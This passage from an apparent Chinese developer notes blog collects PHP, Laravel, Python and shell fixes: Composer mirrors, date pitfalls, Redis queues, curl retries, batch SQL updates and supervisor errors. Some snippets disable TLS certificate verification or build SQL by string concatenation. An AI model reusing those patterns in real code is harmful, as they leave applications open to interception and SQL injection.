https://packagist.laravel-china.org/p/provider-2019-04$c8b07c6782c00960fd236b08f48725c5c63c02a34cc0d60144badfcc9789dc6b.json 7/11: https://packagist.laravel-china.org/p/provider-2018-10$0da5af3cd329f65ef465075887d27aa728a28f442dec760d1af99aacf149716a.json 8/11: https://packagist.laravel-china.org/p/provider-2015$adc4766494fc221443b709dd44d317db9120916304aa4735f2b90702aa2a9e1f.json 9/11: https://packagist.laravel-china.org/p/provider-2017$7f82673b6f8e5f027fba0ad586d772ed67d614dd3273c3989a09ec53dea9b04d.json 10/11: https://packagist.laravel-china.org/p/provider-2016$3df5b457dc3441e50b8f9c6d69a85e1eaefd2cc0627a60c8059bc8e060a19b5c.json 11/11: https://packagist.laravel-china.org/p/provider-2018$911c1fd07a11e2ab44e3423d541ce06e7b9df93c3ebbd5adee02fb9a696c0357.json Finished: success: 11, skipped: 0, failure: 0, total: 11Using version ^1.0 for jonasyeah/client-translator./composer.json has been updatedLoading composer repositories with package informationUpdating dependencies (including require-dev) 1/2: https://dl.laravel-china.org/jonasyeah/translator/c653dd16f8a57c5d9d0cb8d782277b336623b9e3.zip 2/2: https://dl.laravel-china.org/jonasyeah/client-translator/1d4e897bbcf8cd8895ef1252bc7fe7f35287c0a5.zip Finished: success: 2, skipped: 0, failure: 0, total: 2Package operations: 2 installs, 0 updates, 0 removals - Installing jonasyeah/translator (v1.0.0): Loading from cache - Installing jonasyeah/client-translator (v1.0.1): Loading from cacheWriting lock fileGenerating autoload files $ tsl -h ______ ____ ____ ____ _____ _ ____ ______ ___ ____| || \ / || \ / ___/| | / || | / \ | \| || D )| o || _ ( \_ | | | o || || || D )|_| |_|| / | || | |\__ || |___ | ||_| |_|| O || / | | | \ | _ || | |/ \ || || _ | | | | || \ | | | . \| | || | |\ || || | | | | | || . \ |__| |__|\_||__|__||__|__| \___||_____||__|__| |__| \___/ |__|\_|php ./tsl 'to translate statment' -f baidu,youdao $ tsl 爱Translated Successfully来源: youdao长句翻译: love单词翻译: love,like,affection当前目录安装$ composer create-project jonasrepo/client-translator使用$ ./path/client-translator/tsl "今天天气不错"$ ./path/client-translator/tsl "今天天气不错" -f youdao,baiduwhich tsl /c/Users/xxx/AppData/Roaming/Composer/vendor/bin/tslcat tsl #!/usr/bin/env shdir=$(cd "$&#123;0%[/\\]*&#125;" &gt; /dev/null; cd "../jonasyeah/client-translator" &amp;&amp; pwd)if [ -d /proc/cygdrive ] &amp;&amp; [[ $(which php) == $(readlink -n /proc/cygdrive)/* ]]; then # We are in Cgywin using Windows php, so the path must be translated dir=$(cygpath -m "$dir");fi"$&#123;dir&#125;/tsl" "$@"https://learnku.com/articles/30640 镜像123456腾讯 https://mirrors.cloud.tencent.com/composer/composer config -g repos.packagist composer https://mirrors.cloud.tencent.com/composer/华为https://mirrors.huaweicloud.com/阿里云 https://mirrors.aliyun.com/composer/index.htmlcomposer config -g repo.packagist composer https://mirrors.aliyun.com/composer/composer config -g --unset repos.packagist 一键生成 Composer/PHP/ThinkPHP/Laravel 扩展包123456789101112131415161718192021composer g require huangdijia/composer-package-buildercomposer build:composer-plugincomposer build:laravel-packagecomposer build:php-packagecomposer build:thinkphp-package[root@VM_0_11_centos xunsearch-full]# composer build:composer-pluginDo not run Composer as root/super user! See https://getcomposer.org/root for details [OK] Build [my-package] success [root@VM_0_11_centos xunsearch-full]# ll my-package/ total 32 -rw-r--r-- 1 root root 123 Dec 6 20:02 CHANGELOG.md -rw-r--r-- 1 root root 1030 Dec 6 20:02 composer.json -rw-r--r-- 1 root root 2972 Dec 6 20:02 CONTRIBUTING.md -rw-r--r-- 1 root root 1057 Dec 6 20:02 LICENSE.md -rw-r--r-- 1 root root 1039 Dec 6 20:02 phpunit.xml.dist -rw-r--r-- 1 root root 1697 Dec 6 20:02 README.md drwxr-xr-x 3 root root 4096 Dec 6 20:02 src drwxr-xr-x 2 root root 4096 Dec 6 20:02 tests 图片转字符12345678910111213composer require aizuyan/img2asciibin/img2ascii abm.jpg -x 10 -y 20::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::rrii: s::::::::::::::::::::::::::::::::::::::::::::::::::iisMN8B99r::::::::::::::::::::::::::::::::::::::::::::::::: iq0B8M0000r::::::::::::::::::::::::::::::::::::::::::::::: @B8B09BB0@0B ::::::::::::::::::::::::::::::::::::::::::::::r@BBNB08880B0v::::::::::::::::::::::::::::::::::::::::::::ir000B8NB888@B@Noi:::::::::::::::::::::::::::::::::::::::::i00000BB8@B@@808BBsni::::::::::::::::::::::::::::::::::::::: 0B@B00no7vr7ii7rntipi:::::::::::::::https://www.cnblogs.com/iforever/p/6132609.html PHP抖音机器人 php 中使用 strace、gdb、tcpdump 调试工具 PHP 中格式化并高亮 SQL 语句 为什么 (int) 快于 intval? 将 PHP 应用快速打包为 PHAR PHP 7的新特性 MAC之http命令行工具curl PHP实现订单的延时处理 30-seconds-of-php-code composer图标 用PHP玩转进程之二 — 多进程PHPServer]]></content>
      <tags>
        <tag>php</tag>
        <tag>命令行</tag>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开发中遇到的问题整理]]></title>
    <url>%2F2018%2F12%2F04%2F%E5%BC%80%E5%8F%91%E4%B8%AD%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[emojiutf8 编码问题1234567891011 function nickname_encode($s)&#123; $chars = preg_split('//u', $s, null, PREG_SPLIT_NO_EMPTY); foreach ($chars as &amp;$c) &#123; if (strlen($c) &gt; 3 || $c === "%")&#123; $c = urlencode($c); &#125; &#125; return implode($chars); &#125;解码直接用urldecode就行了。 strtotime1234567891011121314151617181920212223242526272829303132333435var_dump(date("Y-m-d", strtotime("2017-06-31")));//输出2017-07-01var_dump(date("Y-m-d", strtotime("-1 month", strtotime("2017-03-31"))));//输出2017-03-03var_dump(date("Y-m-d", strtotime("+1 month", strtotime("2017-08-31"))));//输出2017-10-01var_dump(date("Y-m-d", strtotime("next month", strtotime("2017-01-31"))));//输出2017-03-03var_dump(date("Y-m-d", strtotime("last month", strtotime("2017-03-31"))));//输出2017-03-03var_dump(date("Y-m-d", strtotime("last day of -1 month", strtotime("2017-03-31"))));//输出2017-02-28var_dump(date("Y-m-d", strtotime("first day of +1 month", strtotime("2017-08-31"))));////输出2017-09-01var_dump(date("Y-m-d", strtotime("first day of next month", strtotime("2017-01-31"))));////输出2017-02-01var_dump(date("Y-m-d", strtotime("last day of last month", strtotime("2017-03-31"))));////输出2017-02-28需要获得多少天之前 $day mktime(0, 0, 0, date("m", $startTime), date("d", $startTime) - $day, date("Y", $startTime)); 这个坑在carbon中一样的有. 比如:Carbon::now()-&gt;subMonth(1)-&gt;startOfMonth() 一样的会出现上面说的问题. 你必须这样写:Carbon::now()-&gt;startOfMonth()-&gt;subMonth(1) Carbon::now()-&gt;subMonthNoOverflow(1)-&gt;startOfMonth()https://laravel-china.org/articles/17317$i = 12;while($i &gt;= 1) &#123; echo date('Y-m', strtotime('-' . $i . ' month', strtotime('2018-8'))) . "\n"; $i--;&#125;https://laravel-china.org/articles/18175?#reply67278 解决方法 三元运算符1234567891011运算符可 用于判断$a变量不存在的情况（也可用于数组），而使用三元运算符判断一个未定义的变量，PHP会抛出异常。也正是因为这样，用??判断一个赋值为0的变量的时候结果是不一样的。https://laravel-china.org/articles/17304?#reply64712$a=0;$c=1;$b=$a??$c;echo 'a:'.$a.',b:'.$b.',c:'.$c;//a:0,b:0,c:1$a=0;$c=1;$b=$a?$a:$c;echo 'a:'.$a.',b:'.$b.',c:'.$c;//a:0,b:1,c:1 Error while reading line from the server. [tcp://127.0.0.1:6379]redis 加了代理 Twemproxy，而 predis 对这个配置默认执行 select 操作，导致了连接错误。 大家以后要注意，如果 redis 有代理的话，别忘了把 &#39;database&#39; =&gt; 0,这个配置删掉。https://laravel-china.org/topics/6774/meet-a-pit-of-laravel-redis-share PHP empty 函数判断结果为空1234567891011121314151617181920212223class person&#123; protected $attributes = []; public function __construct(array $attributes) &#123; $this-&gt;attributes = $attributes; &#125; public function __get($name) &#123; return $this-&gt;attributes[$name] ?? null; &#125;&#125;https://laravel-china.org/articles/12530/the-shock-php-empty-function-is-empty-but-the-actual-value-is-nonemptyhttps://laravel-china.org/topics/3021/isset-is-not-right-after-upgrading-php7var_dump( $person-&gt;firstName, empty($person-&gt;firstName), isset($person-&gt;firstName), is_null($person-&gt;firstName)); Laravel Redis 多个进程同时取队列问题Laravel 使用 Redis 的 list 作为队列的数据结构，并会为每个队列分配一个 IDLaravel 中入队列方法12345678910111213141516171819202122232425262728293031323334353637383940414243 public function pushRaw($payload, $queue = null, array $options = [])&#123; $this-&gt;getConnection()-&gt;rpush($this-&gt;getQueue($queue), $payload); return Arr::get(json_decode($payload, true), 'id');&#125;用的是 Redis 的 rpush 命令。Laravel 中取队列方法 public function pop($queue = null)&#123; $original = $queue ?: $this-&gt;default; $queue = $this-&gt;getQueue($queue); $this-&gt;migrateExpiredJobs($queue.':delayed', $queue); if (! is_null($this-&gt;expire)) &#123; $this-&gt;migrateExpiredJobs($queue.':reserved', $queue); &#125; list($job, $reserved) = $this-&gt;getConnection()-&gt;eval( LuaScripts::pop(), 2, $queue, $queue.':reserved', $this-&gt;getTime() + $this-&gt;expire ); if ($reserved) &#123; return new RedisJob($this-&gt;container, $this, $job, $reserved, $original); &#125;&#125;这里用的是 lua 脚本取队列，如下： public static function pop()&#123; return &lt;&lt;&lt;'LUA'local job = redis.call('lpop', KEYS[1])local reserved = falseif(job ~= false) thenreserved = cjson.decode(job)reserved['attempts'] = reserved['attempts'] + 1reserved = cjson.encode(reserved)redis.call('zadd', KEYS[2], ARGV[1], reserved)endreturn &#123;job, reserved&#125;LUA;&#125; 那么结论是：从 Laravel 的处理方式和打印的日志结果看，即使多个进程读取同一个队列，也不会读取到一样的数据。 队列执行失败之后根本不会执行failed方法执行队列侦听器时加上 –tries参数即可，failed()方法只有在重试指定次数完成后才会调用failed()方法如： http://blog.zhouchenxi.cn/post/51.htmlphp artisan queue:listen –queue=default,listeners –tries=3顺便提一下：如果指定了队列名称必须在侦听器的参数上加上 –queue参数才行，不然没有指定的队列是不会运行的。event 指定队列1234567891011121314151617 public $queue = 'listeners';public function queue($queue, $job, $data) &#123; if (isset($this-&gt;queue, $this-&gt;delay)) &#123; return $queue-&gt;laterOn($this-&gt;queue, $this-&gt;delay, $job, $data); &#125; if (isset($this-&gt;queue)) &#123; return $queue-&gt;pushOn($this-&gt;queue, $job, $data); &#125; if (isset($this-&gt;delay)) &#123; return $queue-&gt;later($this-&gt;delay, $job, $data); &#125; return $queue-&gt;push($job, $data); &#125; php7不支持 preg_replace e修正符车轮升级PHP7踩过的一些坑 http://php.swoole.com/wiki/%E8%BD%A6%E8%BD%AE%E5%8D%87%E7%BA%A7PHP7%E8%B8%A9%E8%BF%87%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9D%91 php5 php7不兼容的地方：https://segmentfault.com/a/1190000013837897 12345$joinStr = preg_replace("/__([A-Z_-]+)__/e",$prex.".strtolower('$1')",$joinStr);//替换为preg_replace_callback("/__([A-Z_-]+)__/",function($r) use (&amp;$joinStr)&#123; $joinStr = $prex.strtolower($r[1]);&#125;,$joinStr); 内存溢出1234567891011121314151617181920212223242526//https://laravel-china.org/articles/16312/handling-large-amounts-of-data-to-write-files-to-avoid-memory-overflow-and-response-timeout$beginIndex = 0; $pageLimit = 50000; $endIndex = $beginIndex + $pageLimit; while ($pageData = \DB::connection('hub_log')-&gt;select("SELECT * FROM `&#123;$tableName&#125;` WHERE id &gt; &#123;$beginIndex&#125; and id &lt;= &#123;$endIndex&#125;")) &#123; foreach ($pageData as $row) &#123; file_put_contents(storage_path('mcd_rawdata/'.$tableName.'.txt'), $row-&gt;Content . "\n", FILE_APPEND); &#125; $beginIndex += $pageLimit; $endIndex += $pageLimit; &#125; $public_path = $time.'test.txt'; DB::table('20171220')-&gt;orderBy('id')-&gt;chunk(10000,function($data) use ($public_path)&#123; $arr = ''; foreach ($data-&gt;toArray() as $key =&gt; $value) &#123; $arr .= $value-&gt;Content."\n"; &#125; file_put_contents(public_path($public_path),$arr, FILE_APPEND); unset($data);unset($arr); &#125;); git bash 输入python命令停滞$ python -i$ winpty python -3 保留两位小数 round(a,2)r = lambda f: f - f % 0.01int(a*100)/100print(“%.2f” %a) 后期绑定12345678910111213141516171819202122//https://www.v2ex.com/t/482659#reply8def testFun(): return(lambda x : i*x for i in range(4))for everyLambda in testFun(): print(everyLambda(2))&amp; python test.py0246def testFun(): temp = [lambda x : i*x for i in range(4)] return tempfor everyLambda in testFun(): print(everyLambda(2))&amp; python test.py6666第一个是括号(), 为生成器, 返回 generator第二个是中括号[], 为列表生成式, 返回数组 列表表达式是即时计算的, 而生成器是迭代时才会计算 {} + []123456(&#123;&#125;).valueOf() // []// 返回来的是个对象,继续调用 toString https://www.v2ex.com/t/480998#reply11[].toString() // ""[] + 1// "1"[] + 'a' // "a" echo 后发送 header使用 fastcgi_finish_request();（ PHP-fpm ）可以强制断开客户端连接 session 本质上是 header set-cookie，所以不算输出。这里的输出指的是 response body 的部分 https://www.v2ex.com/t/481127#reply16 isset在php5.6-和php7.0+的一些差异123456789101112131415161718https://segmentfault.com/a/1190000016097997class ProductCategory&#123; const TYPES = [ 1 =&gt; 'type1', 2 =&gt; 'type2', ]; public function getType() &#123; return isset(self::TYPES[$this-&gt;type]) ? self:TYPES[$this-&gt;type] : 'unrecognized_type'; &#125;&#125;//把汉字拆分为数组function ch2arr($str)&#123; return preg_split('//u', $str, null, PREG_SPLIT_NO_EMPTY);&#125; laravel 中使用 导出 excel 时报错PHPExcel_Calculation_Exception: Q5!A65 → Formula Error: An unexpected error occured in /application/www/web_git-pull/vendor/phpoffice/phpexcel/Classes/PHPExcel/Cell.php:291 原因： 在excel中一个单元格如果是以=开头，则说明这个单元格是根据其他单元格的值算出来的，=后面必须跟着一个合法的表达式,而那个字符串是用户的输入，很明显不应该是一个合法的表达式，所以应该在代码中过滤掉 解决：$str = &quot;\t&quot;.$str;//同时解决 如 11111111111 显示成 1.11111E+29参考https://github.com/Maatwebsite/Laravel-Excel/issues/506https://stackoverflow.com/questions/11189145/formula-error-in-phpexcel gzip UnicodeDecodeErrorgzip解码问题 123456789import urllib.requestimport gzip# 注意要先读取内容才可以解压缩data = urllib.request.urlopen(url).read()try: html =data.decode("utf-8")except: html =gzip.decompress(data).decode("utf-8") Intervention/Image 图片写入中文123456789101112https://laravel-china.org/topics/13642/problems-encountered-in-writing-chinese-with-interventionimage-pictures-and-solutionsfunction to_unicode($string)&#123; $str = mb_convert_encoding($string, 'UCS-2', 'UTF-8'); $arrstr = str_split($str, 2); $unistr = ''; foreach ($arrstr as $n) &#123; $dec = hexdec(bin2hex($n)); $unistr .= '&amp;#' . $dec . ';'; &#125; return $unistr;&#125; 获取某字段修改前的值12345678Issue::saving(function(Issue $issue)&#123; if ($issue-&gt;isDirty('title')) &#123; $user = Auth::user()-&gt;username; $oldTitle = $issue-&gt;getOriginal('title'); // 原始值 $newTitle = $issue-&gt;title; // 新值 ActionLog::log("$user 把标题 $oldTitle 修改为 $newTitle"); &#125;&#125;); 前一天12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091https://www.cnblogs.com/lhm166/articles/6066762.html$mytime=mktime(0, 0, 0, date('m'), date('d')-1, date('Y'));//获取时间戳$mytime=date("Y-m-d H:i:s", strtotime("-1 day")); //获取格式为2016-12-30 13:26:13$timetoday = strtotime(date("Y-m-d",time()));function mdate($time = NULL) &#123; $text = ''; $time = $time === NULL || $time &gt; time() ? time() : intval($time); $t = time() - $time; //时间差 （秒） $y = date('Y', $time)-date('Y', time());//是否跨年 switch($t)&#123; case $t == 0: $text = '刚刚'; break; case $t &lt; 60: $text = $t . '秒前'; // 一分钟内 break; case $t &lt; 60 * 60: $text = floor($t / 60) . '分钟前'; //一小时内 break; case $t &lt; 60 * 60 * 24: $text = floor($t / (60 * 60)) . '小时前'; // 一天内 break; case $t &lt; 60 * 60 * 24 * 3: $text = floor($time/(60*60*24)) ==1 ?'昨天 ' . date('H:i', $time) : '前天 ' . date('H:i', $time) ; //昨天和前天 break; case $t &lt; 60 * 60 * 24 * 30: $text = date('m月d日 H:i', $time); //一个月内 break; case $t &lt; 60 * 60 * 24 * 365&amp;&amp;$y==0: $text = date('m月d日', $time); //一年内 break; default: $text = date('Y年m月d日', $time); //一年以前 break; &#125; return $text;&#125;function friend_date($time)&#123; if (!$time) return false; $fdate = ''; $d = time() - intval($time); $ld = $time - mktime(0, 0, 0, 0, 0, date('Y')); //得出年 $md = $time - mktime(0, 0, 0, date('m'), 0, date('Y')); //得出月 $byd = $time - mktime(0, 0, 0, date('m'), date('d') - 2, date('Y')); //前天 $yd = $time - mktime(0, 0, 0, date('m'), date('d') - 1, date('Y')); //昨天 $dd = $time - mktime(0, 0, 0, date('m'), date('d'), date('Y')); //今天 $td = $time - mktime(0, 0, 0, date('m'), date('d') + 1, date('Y')); //明天 $atd = $time - mktime(0, 0, 0, date('m'), date('d') + 2, date('Y')); //后天 if ($d == 0) &#123; $fdate = '刚刚'; &#125; else &#123; switch ($d) &#123; case $d &lt; $atd: $fdate = date('Y年m月d日', $time); break; case $d &lt; $td: $fdate = '后天' . date('H:i', $time); break; case $d &lt; 0: $fdate = '明天' . date('H:i', $time); break; case $d &lt; 60: $fdate = $d . '秒前'; break; case $d &lt; 3600: $fdate = floor($d / 60) . '分钟前'; break; case $d &lt; $dd: $fdate = floor($d / 3600) . '小时前'; break; case $d &lt; $yd: $fdate = '昨天' . date('H:i', $time); break; case $d &lt; $byd: $fdate = '前天' . date('H:i', $time); break; case $d &lt; $md: $fdate = date('m月d日 H:i', $time); break; case $d &lt; $ld: $fdate = date('m月d日', $time); break; default: $fdate = date('Y年m月d日', $time); break; &#125; &#125; return $fdate;&#125; phpstorm xdebug123456789https://www.cnblogs.com/baocheng/p/5775938.htmlhttps://www.cnblogs.com/niuxiaoling/p/8027161.htmlhttps://laravel-china.org/topics/13275/vagrant-phpstorm-xdebughttps://laravel-china.org/articles/12974/phpstrom-xdebug-breakpoint-debug-tutorialhttps://laravel-china.org/articles/16425如果出现Can't start listening for connections from 'xdebug': Port 9000 is busy可修改端口号，要修改两个地方第一个地方是刚才php.ini里面的xdebug.remote_port=9000第二个地方是phpstorm - setting - Languages&amp;Frameworks - 相应的语言（比如PHP） - debug - 修改里面的Debug port Python for 循环中的陷阱https://www.v2ex.com/t/470443#reply38 pyinstaller 打包 exepyinstaller -p venv_path (中间一定要有空格) you.py https://www.v2ex.com/t/476247#reply25http://ju.outofmemory.cn/entry/137370 php捕获fatal error1234567891011121314151617function fatal_handler() &#123; $errfile = "unknown file"; $errstr = "shutdown"; $errno = E_CORE_ERROR; $errline = 0; $error = error_get_last(); if($error)&#123; //发送邮件队列也可以http://www.iamtb.cn/2017/11/17/php-catch-fatel-error/ file_put_contents('./testerror11.txt', json_encode($error)); &#125;&#125;register_shutdown_function("fatal_handler");try&#123; $db=new db();&#125;catch(Exception $e)&#123;echo $e-&gt;error_msg();&#125; PHP7开始，含十六进制字符串不再被认为是数字12345678910$str = "0xffff";//https://segmentfault.com/q/1010000004829059$int = filter_var($str, FILTER_VALIDATE_INT, FILTER_FLAG_ALLOW_HEX);if (false === $int) &#123; throw new Exception("Invalid integer!");&#125;var_dump($int); // int(65535)$t1 = 0x3FFFFFFF &amp; (1 * (0xd5b42e11));$t2 = 0x3FFFFFFF &amp; (1 * (filter_var("0xd5b42e11", FILTER_VALIDATE_INT, FILTER_FLAG_ALLOW_HEX)));var_dump($t1,$t2); php artisan config:cache123456789101112131415161718192021222324252627282930cat config/sentry.phpreturn array( 'dsn' =&gt; env('SENTRY_LARAVEL_DSN'), // capture release as git sha // 'release' =&gt; trim(exec('git log --pretty="%h" -n1 HEAD')), // Capture bindings on SQL queries 'breadcrumbs.sql_bindings' =&gt; true, // Capture default user context 'user_context' =&gt; false, //transport function 'transport'=&gt;function(Raven_Client $raven_Client,&amp;$data)&#123; $raven_Client-&gt;setTransport(null); $raven_Client-&gt;close_curl_resource(); \Queue::pushOn('sentry',new \App\Commands\sentry($raven_Client,$data)); &#125;,);'transport'=&gt;new \app\SentryTransport(),class SentryTransport&#123; public static function __set_state($arr)&#123; return function($raven_Client,&amp;$data)&#123; \Queue::pushOn('sentry',new \App\Commands\sentry($raven_Client,$data)); &#125;; &#125;&#125; curl超时1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980//重试$ch = curl_init();// curl_setopt ($ch, CURLOPT_URL, 'produc_redis.php.com');curl_setopt ($ch, CURLOPT_URL, '11.11.11.1');https://segmentfault.com/a/1190000011188541// I changed UA herecurl_setopt ($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.1) Gecko/20061204 Firefox/2.0.0.1');curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);curl_setopt ($ch, CURLOPT_CONNECTTIMEOUT, 2);curl_setopt ($ch, CURLOPT_AUTOREFERER, true);curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, false);curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 2);$html = curl_exec($ch);var_dump($html,curl_error($ch));$num=3;for($i=1;$i&lt;=$num;$i++)&#123; if(curl_getinfo($ch,CURLINFO_HTTP_CODE)=='0' &amp;&amp; $i&lt;=$num)&#123; echo "retry $i 次".PHP_EOL; if($i==3)&#123; curl_setopt ($ch, CURLOPT_URL, '220.181.57.217'); &#125; $html = curl_exec($ch); &#125;&#125;var_dump($html);var_dump(curl_error($ch));// var_dump(curl_getinfo($ch));/** * curl请求 *https://segmentfault.com/a/1190000010197068 * @param $url * @param string $postData * @param int $timeout * @return array|mixed * @throws Exception */protected static function post($url, $postData = '', $timeout = 5)&#123; $ret = array(); $times = 5; do &#123; $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST"); curl_setopt($ch, CURLOPT_POST, true); curl_setopt($ch, CURLOPT_HEADER, false); if ($postData != '') &#123; curl_setopt($ch, CURLOPT_POSTFIELDS, $postData); &#125; curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout); // 重要, 该处不能丢 curl 执行最大秒数 curl_setopt($ch, CURLOPT_TIMEOUT, $timeout); $output = curl_exec($ch); if ($errNo = curl_errno($ch)) &#123; error_log("Error [$errNo]: " . curl_error($ch)); &#125; else &#123; $ret = json_decode($output, true); // 解析的结果集为空时停止查询 if (!is_array($ret) &amp;&amp; !trim($ret)) &#123; throw new Exception(__METHOD__ . ": cURL调用失败, 信息为: " . $output); &#125; unset($output); &#125; curl_close($ch); if (isset($ret[0]) &amp;&amp; $ret[0]) &#123; return $ret; &#125; &#125; while ($times--); exit(__METHOD__ . ": cURL请求重试至 &#123;$times&#125; 次后仍无响应, 执行退出");&#125; cURL error 281234567891011121314151617181920cURL error 28: See http://curl.haxx.se/libcurl/c/libcurl-errors.html$client=new GuzzleHttp\Client();try &#123; $tmp = $client-&gt;get($url,array("timeout"=&gt;3,"connect_timeout"=&gt;3)); $res = json_decode(strval($tmp-&gt;getBody()),1);&#125; catch (\Exception $e) &#123; $res = []; \Log::info('error', ['url' =&gt; $url, 'msg' =&gt; $e-&gt;getMessage()]);&#125;$client=new GuzzleHttp\Client(); $requests=[ $client-&gt;createRequest('GET',$url,["timeout"=&gt;3,"connect_timeout"=&gt;3]), $client-&gt;createRequest('GET',$url2,["timeout"=&gt;3,"connect_timeout"=&gt;3]), ];$result = Pool::batch($client, $requests, ['pool_size' =&gt; 2]);//$result-&gt;getResult($requests[0]) instanceof GuzzleHttp\Message\Responseif ($result[0] instanceof Response &amp;&amp; $result[0]-&gt;getStatusCode() == 200) &#123; $data = json_decode($result[0]-&gt;getBody(), true); &#125; 格式化123456789101112131415161718192021import prettytable as pthttps://www.v2ex.com/t/483984#reply15## 按行添加数据tb = pt.PrettyTable()tb.field_names = ["City name", "Area", "Population", "Annual Rainfall"]tb.add_row(["Adelaide",1295, 1158259, 600.5])tb.add_row(["Brisbane",5905, 1857594, 1146.4])tb.add_row(["Darwin", 112, 120900, 1714.7])tb.add_row(["Hobart", 1357, 205556,619.5])print(tb) #str.ljust 和 rjust 才是王道，谁用谁知道！+-----------+------+------------+-----------------+| City name | Area | Population | Annual Rainfall |+-----------+------+------------+-----------------+| Adelaide | 1295 | 1158259 | 600.5 || Brisbane | 5905 | 1857594 | 1146.4 || Darwin | 112 | 120900 | 1714.7 || Hobart | 1357 | 205556 | 619.5 |+-----------+------+------------+-----------------+ unicode12345678910111213Unicode 每个字符的详情，可以查官方文档： https://www.unicode.org/charts/python2 代码：for i in range(0x005b,0x005f):print (unichr(i))#print (chr(i))python3 代码请查看 http://www.chenxm.cc/post/683.htmlunicode 字符表示方法 \u + 16 进制数值,例如 \u0001 print(''.join(chr(u) for u in range(0, 0x41))) \u0040 这里 0040 就是 16 进制的，range 是左闭右开的，所以\u0020-\u0040 的码点范围是 range(0x00, 0x40+1)0b 二进制 0o 八进制 0x 16 进制0b10 // 2 0o10 // 80x10 // 16unicode 字符表示方法 \u + 16 进制数值,例如 \u0001print(u'\u0061') // ahttps://www.v2ex.com/t/484923#reply15 laravel更新后读取数据失败123456789101112131415https://laravel-china.org/articles/16566/take-a-laravel-mysql-to-verify-the-experience-of-bug#reply62596//创建数据$meeting = meeting::create($data);//查询数据$meeting = meeting::findOrFail($meeting-&gt;id);//纪录操作日志Log::insert($meeting);线上数据库是读写分离的，主库写入，但更新数据后马上查询，从库可能没来得及更新数据当网络不好时遇到从库更新不及时 findOrFail 就会报 404，导致后面所有操作都失效，自然验证也失效了解决方法更新完后，查询指定使用主库更新后禁止查询，直接使用 create 返回的 model 实例，对于数据库中的有默认值的字段，手动加入到 model 实例中 批量更新12345678910111213141516171819202122232425262728293031323334353637383940414243//https://laravel-china.org/topics/6864/how-to-batch-update-accumulate-a-fieldhttps://laravel-china.org/articles/16620/laravel-project-execl-batch-import-database-data-update-data-no-insertion$arr = [// user_id =&gt; reward '1' =&gt; 50, '2' =&gt; 30, '3' =&gt; 60];User::find(array_keys($arr))-&gt;each(function ($query) use ($arr) &#123; $query-&gt;increment('award' , $arr[$query-&gt;id]);&#125;);# 批量更新相同的 awardUser::find(array_keys($arr))-&gt;each-&gt;increment('award', 30);/** * 批量更新表的值，防止阻塞 * @note 生成的SQL语句如下： * update mj_node set sort = case id * when 13 then 1 * when 1 then 4 * when 7 then 5 * when 8 then 6 * when 9 then 7 * when 10 then 8 * when 11 then 9 * when 12 then 10 * end where id in (13,1,7,8,9,10,11,12) * @param $conditions_field 条件字段 * @param $values_field 需要被更新的字段 * @param $conditions * @param $values * @return int */ public function batchUpdate($conditions_field, $values_field, $conditions, $values) &#123; $table = $this-&gt;model-&gt;getFullTableName();//返回完整表名，自己在项目中定义 $sql = 'update ' . $table . ' set '. $values_field .' = case ' .$conditions_field; foreach ($conditions as $key =&gt; $condition) &#123; $sql .= ' when ' . $condition . ' then ?'; &#125; $sql .= ' end where id in (' . implode(',', $conditions) . ')'; return DB::update($sql, $values);//项目中需要引入DB facade &#125; cat 多换行12345678910111213141516https://www.v2ex.com/t/188162调试shell脚本可以使用 sh -x ****.sh，有详细输出内容Bash的echo默认在末尾加了换行符"\n"，所以你cat那个文件多了一个换行符，给echo加上-n参数就能不自动加换行符了。var= cat tmp.txt;echo $var"abc" 改成如下的形式var= `cat tmp.txt`;echo $var"abc"或者 #注意不是单引号，是tab键上面1前面的那个符号var=$(cat tmp.txt);echo $var"abc"grep显示前后几行信息grep -C 5 foo file 显示file文件里匹配foo字串那行以及上下5行grep -B 5 foo file 显示foo及前5行grep -A 5 foo file 显示foo及后5行$grep -5 'parttern' inputfile //打印匹配行的前后5行查看某一个文件第5行和第10行 sed -n '5,10p' filename 这样你就可以只查看文件的第5行到第10行。 grep and or123456https://blog.csdn.net/jackaduma/article/details/6900242grep -E 'Tech|Sales' employee.txtgrep -v 'pattern1' filename$ grep -E 'Manager.*Sales|Sales.*Manager' employee.txt # -E 'pattern1.*pattern2'egrep "php.*artisan.*$1"egrep 'pattern1|pattern2' filename memcached 默认的过期时间则 不能大于 30 天https://laravel-china.org/topics/2461/laravel-session-using-memcached-stepping-on-the-pit unix:///tmp/supervisor.sock refused connection12345678910111213141516171819202122232425[root@localhost supervisor]# supervisorctl -c /etc/supervisord.confunix:///tmp/supervisor.sock refused connectionsupervisor&gt; exit rm -f /tmp/supervisor.sock[root@localhost supervisor]# ps aux|grep superroot 48 0.0 0.0 0 0 ? S 2017 2:17 [sync_supers]root 8246 0.0 0.1 208064 13404 ? Ss 18:17 0:00 /usr/bin/python /usr/bin/supervisord -c /etc/supervisord.confsupervisord是服务端，是个deamon，supervisorctl是客户https://www.v2ex.com/t/210122修改supervisor.conf文件后，要执行supervisorctl reload，重新加载配置文件vi artisan.conf[root@localhost supervisor]# supervisorctl statusunix:///tmp/supervisor.sock no such file[root@localhost supervisor]# ps aux|grep superroot 48 0.0 0.0 0 0 ? S 2017 2:17 [sync_supers]root 19472 0.0 0.0 103256 844 pts/5 S+ 19:57 0:00 grep super[root@localhost supervisor]# supervisord -c /etc/supervisord.confError: Invalid user name www in section 'program:artisan_queue' (file: '/etc/supervisor/artisan.conf')For help, use /usr/bin/supervisord -h[root@localhost supervisor]# vi /etc/supervisor/artisan.conf[root@localhost supervisor]# supervisord -c 